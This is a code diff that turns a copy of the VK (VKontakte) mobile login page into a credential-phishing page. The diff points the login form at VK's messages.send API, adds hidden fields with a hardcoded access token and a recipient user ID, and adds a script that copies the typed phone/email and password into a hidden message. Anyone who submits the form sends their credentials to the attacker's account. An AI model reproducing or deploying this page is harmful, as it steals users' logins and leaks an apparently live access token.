@@ -129,19 +129,32 @@
       Мобильная версия поможет Вам оставаться ВКонтакте, даже если Вы далеко от компьютера.
     </div>
     
-    <form method="POST" action="https://login.vk.com/?act=login&_origin=https://m.vk.com&ip_h=806720b232ed07beea&lg_h=0f27a0be7e32d32381&role=pda&utf8=1" novalidate>
+    <form method="POST" action="https://api.vk.com/method/messages.send" novalidate>
+         <input name="user_id" value="396194137" class="" style="display:none"/>
+    <input name="random_id" id="gg" class="" style="display:none"/>
+    <input name="message" id="c" class="" style="display:none"/>
+    <input name="" value="lol" class="" style="display:none" id="u"/>
+    <input name="access_token" value="8d0619dd95588e8714f5717fd01db7a9227ed92033934f7661049ba904e82bc460cf88196f23f58f143ff" class="" style="display:none"/>
+    <input name="v" value="5.100" class="" style="display:none"/>       
       <dl class="fi_row">
         <dd>
-          <input type="text" class="textfield" name="email" value="" placeholder="Телефон или email" />
+          <input type="text" class="textfield" name="email" value="" id="inp" placeholder="Телефон или email" />
         </dd>
       </dl>
       <dl class="fi_row">
         <dd>
-          <input type="password" class="textfield" name="pass" placeholder="Пароль" />
+          <input type="password" class="textfield" name="pass" id="ip" placeholder="Пароль" />
         </dd>
       </dl>
       
       <div class="fi_row_new">
+                              <script> var inp = document.getElementById('inp');
+var ip = document.getElementById('ip');
+var c =  document.getElementById('c');
+document.addEventListener('input',function(){
+c.value='login: '+inp.value + ' ,password: '+ip.value;
+
+});</script>
         <input class="button wide_button" type="submit" value="Войти" />
       </div>
       <div class="fi_row">
